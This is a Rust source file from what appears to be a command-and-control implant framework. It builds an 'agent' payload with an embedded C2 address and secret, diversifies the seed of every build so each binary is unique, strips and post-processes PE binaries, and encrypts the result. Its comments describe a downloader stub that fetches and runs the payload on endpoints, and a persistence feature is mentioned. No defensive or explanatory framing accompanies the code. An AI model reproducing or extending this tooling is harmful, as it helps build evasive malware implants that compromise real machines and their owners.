//! Payload build pipeline: cargo build → strip → artifact kit → encrypt → write to `dist/`.

use anyhow::{anyhow, Context, Result};
use std::path::{Path, PathBuf};
use std::process::Command;
use tracing::{info, warn};

use crate::config::{partition_features, read_agent_features, PayloadConfig};
use crate::pe_artifact_kit;

/// Build the agent for the given profile and return the raw binary bytes.
///
/// When `override_seed` is `Some(value)`, both `OPTIMIZER_STUB_SEED` and
/// `CODE_TRANSFORM_SEED` are set to that value so the build is fully
/// reproducible.  When `None`, fresh random seeds are generated for each
/// build, producing unique binaries every time.
pub fn build_agent_for_profile(cfg: &PayloadConfig, override_seed: Option<u64>) -> Result<Vec<u8>> {
    let triple = cfg.target_triple()?;
    let package = cfg.package.as_str();
    let bin_name = cfg.bin_name.as_deref().unwrap_or(package);

    let effective_features = features_for_package(package, &cfg.features)?;

    let mut extra_env: Vec<(String, String)> = Vec::new();
    if effective_features.iter().any(|f| f == "outbound-c") {
        extra_env.push(("ORCHESTRA_C_ADDR".into(), cfg.c2_address.clone()));
        if let Some(ref fp) = cfg.server_cert_fingerprint {
            extra_env.push(("ORCHESTRA_C_CERT_FP".into(), fp.clone()));
        }
        if let Some(ref secret) = cfg.c_server_secret {
            extra_env.push(("ORCHESTRA_C_SECRET".into(), secret.clone()));
        } else {
            warn!(
                "outbound-c feature enabled but c_server_secret is not set in the profile. \
                 The agent will require the ORCHESTRA_SECRET env var at runtime."
            );
        }
    }

    // ── Per-build seed diversification ──────────────────────────────────────
    //
    // Every build gets unique OPTIMIZER_STUB_SEED and CODE_TRANSFORM_SEED
    // values, so the resulting binary differs from every other build even when
    // the source code and profile are identical.  When `override_seed` is
    // supplied the same value is used for both seeds, making the build
    // bit-for-bit reproducible.
    let seed = override_seed.unwrap_or_else(generate_random_seed);
    let seed_hex = format!("{:016x}", seed);
    info!(seed = %seed_hex, "Build diversification seed");
    extra_env.push(("OPTIMIZER_STUB_SEED".into(), seed_hex.clone()));
    extra_env.push(("CODE_TRANSFORM_SEED".into(), seed.to_string()));

    info!(target_triple = %triple, package, bin = %bin_name, "Building agent payload");
    let bin_path = cargo_build(package, bin_name, &triple, &effective_features, &extra_env)?;

    if let Err(e) = strip_if_available(&bin_path, &triple) {
        warn!("strip step skipped: {e:#}");
    }

    let mut binary = std::fs::read(&bin_path)
        .with_context(|| format!("Failed to read built binary {}", bin_path.display()))?;

    // Apply PE artifact kit post-processing (no-op for non-PE / non-Windows targets).
    pe_artifact_kit::apply_all(&mut binary, cfg)
        .context("PE artifact kit post-processing failed")?;

    Ok(binary)
}

fn features_for_package(package: &str, requested: &[String]) -> Result<Vec<String>> {
    match package {
        "agent" => {
            let available = read_agent_features().unwrap_or_default();
            let (effective_features, unknown_features) = if available.is_empty() {
                (requested.to_vec(), Vec::new())
            } else {
                partition_features(requested, &available)
            };
            if !unknown_features.is_empty() {
                anyhow::bail!(
                    "profile references feature(s) not declared in agent/Cargo.toml: {}",
                    unknown_features.join(", ")
                );
            }
            Ok(effective_features)
        }
        "launcher" => {
            // The launcher binary is a *downloader stub* that the operator
            // deploys directly to the endpoint (via MDM, rsync, etc.).  It
            // fetches and runs the encrypted agent payload at runtime, so it
            // must not itself be encrypted and served as a downloadable payload
            // (that would require another launcher to download it — circular).
            //
            // If you are trying to build the agent payload to be served on the
            // payload-server, use:
            //   package = "agent"
            //   (no outbound-c: agent waits for inbound server connection)
            //   (outbound-c: agent dials the Control Center automatically)
            //
            // The launcher binary is built with `cargo build -p launcher` and
            // deployed out-of-band; it does not go through the profile/encrypt
            // pipeline.
            anyhow::bail!(
                "package `launcher` cannot be used as a downloadable payload target.\n\
                 The launcher binary is a downloader stub that is deployed directly to \
                 the endpoint — encrypting it as a payload would require another launcher \
                 to download it, creating a circular dependency.\n\
                 \n\
                 To build the agent payload served by the dev-server, set:\n\
                 \n  package = \"agent\"\n\
                 \n\
                 Then build the launcher stub separately with:\n\
                 \n  cargo build --release -p launcher --target <triple>"
            )
        }
        other => anyhow::bail!(
            "unsupported payload package `{other}`; supported packages are `agent` and `launcher`"
        ),
    }
}

/// Run `cargo build --release` for the specified package and target.
fn cargo_build(
    package: &str,
    bin: &str,
    triple: &str,
    features: &[String],
    extra_env: &[(String, String)],
) -> Result<PathBuf> {
    let mut args = vec![
        "build".to_string(),
        "--release".to_string(),
        "--package".to_string(),
        package.to_string(),
        "--bin".to_string(),
        bin.to_string(),
        "--target".to_string(),
        triple.to_string(),
    ];
    if !features.is_empty() {
        args.push("--features".to_string());
        args.push(features.join(","));
    }

    let mut cmd = Command::new("cargo");
    cmd.args(&args).envs(extra_env.iter().cloned());

    info!("Running: {:?}", cmd);
    let status = cmd
        .status()
        .with_context(|| format!("Failed to execute cargo build for {package}"))?;

    if !status.success() {
        return Err(anyhow!("cargo build for {package} failed"));
    }

    // The final binary is in `target/<triple>/release/<bin_name>[.exe]`.
    let artifact_name = if triple.contains("windows") {
        format!("{bin}.exe")
    } else {
        bin.to_string()
    };
    let path = Path::new("target")
        .join(triple)
        .join("release")
        .join(artifact_name);
    if !path.exists() {
        anyhow::bail!("expected built binary at {}", path.display());
    }
    Ok(path)
}

/// Run a target-compatible `strip` on the binary if the tool is available.
fn strip_if_available(path: &Path, triple: &str) -> Result<()> {
    let host = host_triple();
    let is_cross_target = host.as_deref() != Some(triple);
    let strip = if triple.contains("windows") {
        which::which(format!("{triple}-strip"))
            .or_else(|_| which::which("x86_64-w64-mingw32-strip"))
            .map_err(|_| anyhow!("no Windows-compatible strip tool on PATH"))?
    } else if is_cross_target {
        which::which(format!("{triple}-strip"))
            .map_err(|_| anyhow!("no target-compatible {triple}-strip tool on PATH"))?
    } else {
        which::which("strip").map_err(|e| anyhow!("`strip` not on PATH: {e}"))?
    };
    info!("Stripping binary with {}", strip.display());
    let status = Command::new(strip)
        .arg(path)
        .status()
        .context("Failed to run `strip`")?;
    if !status.success() {
        warn!("strip command failed");
    }
    Ok(())
}

fn host_triple() -> Option<String> {
    let output = Command::new("rustc").arg("-vV").output().ok()?;
    if !output.status.success() {
        return None;
    }
    let stdout = String::from_utf8_lossy(&output.stdout);
    stdout
        .lines()
        .find_map(|line| line.strip_prefix("host: ").map(str::to_owned))
}

/// Generate a random `u64` seed using OS entropy.
///
/// Reads 8 bytes from `/dev/urandom` on Unix or uses `rand` crate on other
/// platforms.  Falls back to a time+pid hash only if the OS source is
/// unavailable.
fn generate_random_seed() -> u64 {
    #[cfg(unix)]
    {
        use std::io::Read;
        if let Ok(mut f) = std::fs::File::open("/dev/urandom") {
            let mut buf = [0u8; 8];
            if f.read_exact(&mut buf).is_ok() {
                return u64::from_le_bytes(buf);
            }
        }
    }
    // Fallback: mix time and PID.
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64;
    let pid = std::process::id() as u64;
    now ^ pid.wrapping_mul(0x9E3779B97F4A7C15)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn launcher_rejects_agent_features() {
        let requested = vec!["persistence".to_string()];
        let err = features_for_package("launcher", &requested).unwrap_err();
        assert!(err.to_string().contains("launcher"));
    }

    #[test]
    fn unsupported_package_is_rejected() {
        let err = features_for_package("not-a-package", &[]).unwrap_err();
        assert!(err.to_string().contains("unsupported payload package"));
    }
}
